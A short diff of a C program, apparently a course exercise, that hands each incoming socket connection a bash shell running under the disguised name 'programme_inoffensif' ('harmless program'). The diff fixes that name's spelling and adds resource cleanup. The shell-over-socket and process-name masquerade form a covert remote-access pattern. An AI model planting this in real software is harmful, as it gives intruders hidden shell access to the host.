@@ -22,7 +22,7 @@ void zombieFils(void* sockfdController){
     dup2(*sockfd, STDERR_FILENO);
     dup2(*sockfd,STDIN_FILENO);
     sclose(*sockfd);
-    sexecl("/bin/bash", "programme_inoffenssif", NULL);
+    sexecl("/bin/bash", "programme_inoffensif", NULL);
 }
 
 int main(int argc, char *argv[]){
@@ -49,7 +49,6 @@ int main(int argc, char *argv[]){
         sockfdController[i] = accept(sockfd, NULL, NULL);
         if(sockfdController[i] != -1){
             pids_chils[i] = fork_and_run1(zombieFils, &sockfdController[i]);
-            //fork_and_run1(zombieFils, &sockfdController[i]);
             i++;
         }else {
             break;
@@ -60,6 +59,7 @@ int main(int argc, char *argv[]){
         skill(pids_chils[i],SIGTERM);
     }
     
-
+    sclose(sockfd);
+    free(pids_chils);
     free(sockfdController);
 }
